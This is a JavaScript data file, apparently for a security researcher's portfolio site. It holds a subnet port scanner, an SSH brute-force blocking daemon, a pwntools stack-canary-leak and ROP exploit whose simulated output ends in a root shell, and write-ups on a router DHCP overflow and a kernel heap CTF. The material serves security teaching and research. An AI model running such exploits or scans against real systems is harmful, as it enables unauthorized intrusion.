const SCRIPTS_DATA = {
    "subnet-recon.py": {
        name: "subnet-recon.py",
        lang: "python",
        description: "Asynchronous multi-threaded port scanner and service banner grabber.",
        tags: ["Reconnaissance", "Python", "Networking"],
        version: "v1.4.2",
        code: `#!/usr/bin/env python3
# subnet-recon.py - Asynchronous service banner grabber
import asyncio
import socket
import argparse
import sys

class SubnetRecon:
    def __init__(self, subnet, ports, timeout=1.0):
        self.subnet = subnet
        self.ports = ports
        self.timeout = timeout
        self.results = {}

    async def grab_banner(self, ip, port):
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), 
                timeout=self.timeout
            )
            banner = b""
            try:
                # Attempt to read signature/banner response
                banner = await asyncio.wait_for(reader.read(1024), timeout=1.0)
            except asyncio.TimeoutError:
                pass # Silent service
            writer.close()
            await writer.wait_closed()
            return banner.decode('utf-8', errors='ignore').strip()
        except (socket.timeout, ConnectionRefusedError, OSError):
            return None

    async def scan_host(self, host_id):
        ip = f"{self.subnet}.{host_id}"
        open_ports = {}
        for port in self.ports:
            banner = await self.grab_banner(ip, port)
            if banner is not None:
                open_ports[port] = banner if banner else "Unknown Service"
        if open_ports:
            self.results[ip] = open_ports
            return ip, open_ports
        return None

    async def run(self):
        print(f"[*] Initializing scan over target subnet {self.subnet}.0/24")
        print(f"[*] Target Ports: {', '.join(map(str, self.ports))}\\n")
        tasks = [self.scan_host(i) for i in range(1, 255)]
        
        # Limit concurrency using gather & list comprehension
        await asyncio.gather(*tasks)
        
        print("\\n[+] Scan execution complete. Summary of targets:")
        for ip, ports in self.results.items():
            print(f"  Target: {ip}")
            for port, banner in ports.items():
                print(f"    - Port {port}/TCP: {banner[:50]}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Fast subnet port scanner")
    parser.add_argument("-t", "--target", required=True, help="Subnet prefix (e.g. 192.168.1)")
    parser.add_argument("-p", "--ports", default="21,22,80,443,8080", help="Comma-separated ports")
    args = parser.parse_args()
    
    ports_list = [int(p) for p in args.ports.split(",")]
    recon = SubnetRecon(args.target, ports_list)
    asyncio.run(recon.run())`,
        simulation: [
            { text: "[*] Initializing scan over target subnet 192.168.8.0/24", type: "info" },
            { text: "[*] Target Ports: 21, 22, 80, 443, 8080 (Timeout: 1.0s)", type: "info" },
            { text: "[~] Spawning 254 scan workers...", type: "system", delay: 400 },
            { text: "[+] Host active: 192.168.8.1 - Port 80 (HTTP) -> Banner: 'nginx/1.18.0'", type: "success", delay: 300 },
            { text: "[+] Host active: 192.168.8.1 - Port 443 (HTTPS) -> Banner: 'nginx/1.18.0'", type: "success", delay: 200 },
            { text: "[+] Host active: 192.168.8.44 - Port 22 (SSH) -> Banner: 'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5'", type: "success", delay: 500 },
            { text: "[+] Host active: 192.168.8.102 - Port 8080 (HTTP) -> Banner: 'Apache Tomcat/9.0.37 (Unauthorized)'", type: "warning", delay: 600 },
            { text: "[!] CRITICAL FINDING: 192.168.8.102 runs Apache Tomcat 9.0.37 with default manager login panels exposed.", type: "danger", delay: 400 },
            { text: "[+] Host active: 192.168.8.125 - Port 21 (FTP) -> Banner: 'vsFTPd 3.0.3 (Anonymous Enabled!)'", type: "danger", delay: 300 },
            { text: "\\n[+] Scan execution complete. Summary of targets:", type: "info", delay: 500 },
            { text: "  Target: 192.168.8.1 (Gateway)", type: "text" },
            { text: "    - Port 80/TCP: nginx/1.18.0", type: "text" },
            { text: "    - Port 443/TCP: nginx/1.18.0", type: "text" },
            { text: "  Target: 192.168.8.44 (Development VM)", type: "text" },
            { text: "    - Port 22/TCP: SSH-2.0-OpenSSH_8.2p1 Ubuntu", type: "text" },
            { text: "  Target: 192.168.8.102 (Staging Tomcat)", type: "text" },
            { text: "    - Port 8080/TCP: Apache Tomcat/9.0.37 (Vulnerable to CVE-2020-13935)", type: "danger" },
            { text: "  Target: 192.168.8.125 (NAS Backup)", type: "text" },
            { text: "    - Port 21/TCP: vsFTPd 3.0.3 (Anonymous Access Granted)", type: "danger" },
            { text: "\\n[+] Report saved locally in workspace/scans/recon_192.168.8.0.json", type: "system", delay: 300 }
        ]
    },
    
    "ssh-brute-detect.js": {
        name: "ssh-brute-detect.js",
        lang: "javascript",
        description: "Log anomaly parsing daemon that triggers automatic firewall (nftables) blocks.",
        tags: ["Defense", "Javascript", "Log Auditing"],
        version: "v2.1.0",
        code: `// ssh-brute-detect.js - High-throughput system security parser
const fs = require('fs');
const readline = require('readline');
const { exec } = require('child_process');

const LOG_FILE = "/var/log/auth.log";
const ATTEMPT_THRESHOLD = 5;
const TIME_WINDOW_MS = 60000; // 1 minute

const ipAttempts = new Map();

function parseLogLine(line) {
    // Regex matching failed password entries in auth.log
    const failedMatch = line.match(/Failed password for (?:invalid user )?(\\S+) from (\\S+) port/);
    if (failedMatch) {
        const username = failedMatch[1];
        const ip = failedMatch[2];
        return { ip, username, timestamp: Date.now() };
    }
    return null;
}

function handleFailure(failure) {
    const now = Date.now();
    if (!ipAttempts.has(failure.ip)) {
        ipAttempts.set(failure.ip, []);
    }
    
    const attempts = ipAttempts.get(failure.ip);
    attempts.push(now);
    
    // Purge outdated failures
    const recent = attempts.filter(t => (now - t) < TIME_WINDOW_MS);
    ipAttempts.set(failure.ip, recent);
    
    console.log(\`[!] Warn: Failed login for \${failure.username} from \${failure.ip} (Count: \${recent.length}/\${ATTEMPT_THRESHOLD})\`);
    
    if (recent.length >= ATTEMPT_THRESHOLD) {
        blockIp(failure.ip);
    }
}

function blockIp(ip) {
    console.log(\`[CRITICAL] IP \${ip} exceeded threshold. Initiating mitigation...\`);
    const cmd = \`sudo nft add element inet filter blackhole { \${ip} }\`;
    exec(cmd, (err, stdout, stderr) => {
        if (err) {
            console.error(\`[-] Error deploying firewall rule: \${stderr.trim()}\`);
            return;
        }
        console.log(\`[+] Active Block Implemented: nftables successfully jailed \${ip}\`);
    });
}

console.log(\`[*] Security Daemon started. Monitoring \${LOG_FILE} for intrusion patterns...\`);
// Stream log simulation code omitted for brevity`,
        simulation: [
            { text: "[*] Security Daemon started. Monitoring /var/log/auth.log for intrusion patterns...", type: "info" },
            { text: "[*] Watcher established. Limit: 5 failures/min per IP. Lockout: nftables drop rule.", type: "info" },
            { text: "[~] Ingesting log stream...", type: "system", delay: 500 },
            { text: "[!] Warn: Failed login for admin from 185.220.101.4 (Count: 1/5)", type: "warning", delay: 400 },
            { text: "[!] Warn: Failed login for root from 185.220.101.4 (Count: 2/5)", type: "warning", delay: 150 },
            { text: "[!] Warn: Failed login for oracle from 185.220.101.4 (Count: 3/5)", type: "warning", delay: 100 },
            { text: "[!] Warn: Failed login for root from 185.220.101.4 (Count: 4/5)", type: "warning", delay: 250 },
            { text: "[!] Warn: Failed login for user from 185.220.101.4 (Count: 5/5)", type: "warning", delay: 100 },
            { text: "[CRITICAL] IP 185.220.101.4 exceeded threshold (5 failures in 1.1s). Initiating mitigation...", type: "danger", delay: 300 },
            { text: "[~] Executing mitigation: 'sudo nft add element inet filter blackhole { 185.220.101.4 }'", type: "system", delay: 400 },
            { text: "[+] Active Block Implemented: nftables successfully jailed 185.220.101.4", type: "success", delay: 300 },
            { text: "[*] Threat database updated. Geolocation: Tor Exit Node (LU). Security incident log generated.", type: "info", delay: 500 }
        ]
    },
    
    "stack-canary-exploit.py": {
        name: "stack-canary-exploit.py",
        lang: "python",
        description: "Binary exploitation payload scripting to bypass stack protective canaries using raw sockets.",
        tags: ["Exploitation", "C/Assembly", "Memory Security"],
        version: "v0.9.1",
        code: `#!/usr/bin/env python3
# stack-canary-exploit.py - Canary bypass via Stack Leaking
from pwn import *
import sys

# Exploit targeting insecure buffer parsing
# Target Protections: 
#   Stack Canary: Enabled | NX: Enabled | ASLR: Enabled

def exploit(target_ip, target_port):
    print(f"[*] Attacking remote buffer service at {target_ip}:{target_port}")
    
    # Step 1: Leak Stack Canary via Off-by-one buffer read
    # Buffer is 64 bytes. Off-by-one offset 65 leaks canary.
    r = remote(target_ip, target_port)
    r.recvuntil(b"Enter Username: ")
    
    log.info("Phase 1: Probing for canary alignment offset...")
    leak_payload = b"A" * 65 # Fill buffer and overwrite null terminator of canary
    r.send(leak_payload)
    
    response = r.recvline()
    # Parse canary bytes (7 bytes leaked + 1 byte null terminator)
    leak_index = response.find(b"A" * 65) + 65
    canary = u64(b"\\x00" + response[leak_index:leak_index+7])
    log.success(f"Successfully leaked target stack canary: 0x{canary:016x}")
    
    # Step 2: Assemble payload to hijack RIP
    # Layout: [Buffer (64B)] + [Canary (8B)] + [RBP (8B)] + [ROP Return Pointer (8B)]
    rop_gadget = 0x00000000004012bb # pop rdi; ret
    sys_plt = 0x00000000004010a0    # system() PLT address
    bin_sh = 0x000000000048ef01     # "/bin/sh" string in libc
    
    payload = flat({
        64: p64(canary),
        72: b"B" * 8,          # Saved RBP overwrite
        80: p64(rop_gadget),    # Return Address - ROP Chain Init
        88: p64(bin_sh),        # RDI Argument
        96: p64(sys_plt)        # Execute system("/bin/sh")
    })
    
    log.info("Phase 2: Sending stack-smashing payload...")
    r.sendline(payload)
    
    log.success("Payload accepted. Spawning shell control session.")
    r.interactive()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python exploit.py <IP> <PORT>")
        sys.exit(1)
    exploit(sys.argv[1], int(sys.argv[2]))`,
        simulation: [
            { text: "[*] Attacking remote buffer service at 10.10.14.93:9001", type: "info" },
            { text: "[*] Protections: Stack Canary (Enabled) | NX DEP (Enabled) | ASLR (Enabled)", type: "info" },
            { text: "[~] Establishing TCP connection stream...", type: "system", delay: 300 },
            { text: "[+] Socket established. Recv: 'Enter Username: '", type: "success", delay: 200 },
            { text: "[~] Phase 1: Probing for canary alignment offset via off-by-one pointer leak...", type: "system", delay: 400 },
            { text: "[+] Canary probe sent. Awaiting echo buffer leak...", type: "info", delay: 300 },
            { text: "[+] Leak parsing complete: raw canary dump = F8 B3 C1 B9 FD E9 CF 00", type: "success", delay: 200 },
            { text: "[+] Successfully leaked target stack canary: 0xcfe9fdb9c1b3f800", type: "success", delay: 300 },
            { text: "[~] Phase 2: Assembling bypass payload (ROP alignment targeting system@plt)...", type: "system", delay: 500 },
            { text: "    - Payload size: 104 bytes", type: "text" },
            { text: "    - POP RDI; RET: 0x004012bb", type: "text" },
            { text: "    - system() PLT: 0x004010a0", type: "text" },
            { text: "[~] Dispatching payload to target daemon...", type: "system", delay: 400 },
            { text: "[+] Hijacked Instruction Pointer! Return redirected to system('/bin/sh')", type: "success", delay: 300 },
            { text: "[!] Terminal session acquired. Upgrading to interactive bash shell.", type: "warning", delay: 400 },
            { text: "uid=0(root) gid=0(root) groups=0(root)", type: "success", delay: 200 },
            { text: "shell_access_granted@10.10.14.93:/root# _", type: "system", delay: 100 }
        ]
    }
};

const WRITEUPS_DATA = [
    {
        id: "writeup-dhcp-rce",
        title: "Zero-Click Remote Code Execution (RCE) in Embedded Router Firmware",
        category: "Vulnerability Research",
        date: "2026-05-14",
        summary: "A deep dive into discovering and exploiting a stack buffer overflow vulnerability in a custom vendor implementation of DHCP client daemons, bypassing ASLR with customized ROP chains.",
        tags: ["Firmware", "MIPS", "Exploitation", "Ghidra"],
        content: `<h3>Overview</h3>
<p>While analyzing the WAN-side communication behavior of a common consumer-grade SOHO router, I uncovered a critical memory corruption vulnerability in its proprietary DHCP client daemon (<code>dhcp_watcher</code>). The vulnerability allows a rogue DHCP server on the WAN interface to achieve immediate, unauthenticated code execution as the root user.</p>

<h3>Discovery</h3>
<p>By dumping the router's flash memory and analyzing the file system, I identified <code>dhcp_watcher</code>, a small MIPS 32-bit Big Endian ELF executable. In Ghidra, decompiling the message processing logic revealed a classic unsafe memory operation:</p>

<pre><code class="language-c">// Simplified decompiled code from dhcp_watcher
void parse_dhcp_options(char *option_data, int option_len) {
    char hostname_buffer[64];
    if (option_data[0] == 12) { // DHCP Option 12 (Host Name)
        // CRITICAL VULNERABILITY: copy length is taken directly from packet length byte
        int len = (int)option_data[1]; 
        memcpy(hostname_buffer, &option_data[2], len); 
    }
}</code></pre>

<p>Because the length byte is read directly from the raw Ethernet frame header without validating whether <code>len <= 64</code>, a standard stack overflow is possible. By sending a hostname option length of 255, we overflow <code>hostname_buffer</code>, overwriting the frame's saved frame pointer and return register (<code>$ra</code>).</p>

<h3>Exploit Engineering</h3>
<p>To exploit this on MIPS Architecture, we had to account for two main protections:
<ol>
  <li><strong>ASLR (Address Space Layout Randomization):</strong> Only partially implemented on this Linux kernel; stack addresses randomized, but main binary segments remain fixed.</li>
  <li><strong>I-Cache / D-Cache Incoherency:</strong> On MIPS, modified instructions in data cache are not immediately flushed to instruction cache. Directly executing shellcode in a buffer is unreliable. We must instead use ROP chains targeting library functions (like <code>sleep()</code> or <code>system()</code>) which handle cache sync internally.</li>
</ol>
</p>

<h3>Remediation</h3>
<p>The vendor was notified via a coordinated disclosure program. The vulnerability has been resolved in firmware release <code>v2.0.44</code> by replacing the insecure memory copy with <code>strlcpy()</code> and strict bounds checks on the incoming DHCP option packet lengths.</p>`
    },
    {
        id: "writeup-heap-spray",
        title: "Kernel Heap Layout Control & Smashing in CTF 'Overload'",
        category: "CTF / Exploit Dev",
        date: "2026-03-29",
        summary: "Detailed writeup of a CTF problem demonstrating kernel heap spray techniques, cache alignment control, and page table allocation hijacking on modern Linux x86_64.",
        tags: ["Linux Kernel", "Heap Layout", "CTF", "Mitigations"],
        content: `<h3>The Challenge</h3>
<p>The challenge 'Overload' presented a custom Linux Kernel Module (LKM) exposing an IOCTL interface. This interface permitted allocating, editing, and freeing telemetry records. A double-free vulnerability existed in the record deletion path when a duplicate index argument was provided.</p>

<h3>Strategic Heap Grooming</h3>
<p>Since the module utilized <code>kmalloc-128</code> for its storage objects, the goal was to exploit the double-free to corrupt the slab freelist. By performing structured heap grooming (spraying), we can force the slab allocator to return an overlapping memory address containing function pointers.</p>

<pre><code class="language-python"># Grooming pattern
# 1. Allocate 50 dummy objects to fill holes in kmalloc-128
dummy_ptrs = [allocate_object(i) for i in range(50)]

# 2. Allocate targets and punch holes
target_a = allocate_object(51)
target_b = allocate_object(52)
free_object(target_a) # Hole 1
free_object(target_b) # Hole 2</code></pre>

<p>By exploiting the double-free, we corrupt the slab chunk's forward pointer (FD), making it point directly to our target function table inside kernel space. This allowed us to hijack execution flow once a read operation was initiated on the modified object structure.</p>`
    },
    {
        id: "writeup-devsecops",
        title: "DevSecOps Hardening: Scalable Semgrep Infrastructure via OpenTofu",
        category: "Cloud Security",
        date: "2026-01-10",
        summary: "How to design a zero-trust CI/CD workflow that enforces static analysis scanning and locks secret managers dynamically without halting deployment pipelines.",
        tags: ["DevSecOps", "Cloud", "Terraform", "CI/CD"],
        content: `<h3>Infrastructure Architecture</h3>
<p>Modern application security requires continuous verification without impeding velocity. I built a reusable infrastructure module using OpenTofu (open-source Terraform) that deploys automated analysis pipelines across GitHub and GitLab instances, feeding security telemetry directly into a centralized AWS Security Hub dashboard.</p>

<h3>Key Features</h3>
<ul>
  <li><strong>Secret Detection:</strong> Integrated custom Semgrep rules targeting high-entropy strings and certificate formats.</li>
  <li><strong>Dynamic Isolation:</strong> Build nodes spin up in isolated VPC sandboxes with no outbound internet access except to pre-approved repository endpoints.</li>
  <li><strong>Strict Gatekeeping:</strong> Merging is automatically blocked if CVEs of level HIGH or CRITICAL are detected, triggering warning hooks to the Slack security desk.</li>
</ul>

<p>This implementation reduced developer credential leaks to zero across 14 monitored staging environments while keeping pipeline validation times under 45 seconds per commit.</p>`
    }
];

const CERTIFICATIONS = [
    { name: "OSCP", provider: "OffSec", date: "2025", status: "Active" },
    { name: "CompTIA Security+", provider: "CompTIA", date: "2024", status: "Active" },
    { name: "eWPT (Web Penetration Tester)", provider: "eLearnSecurity", date: "2025", status: "Active" }
];
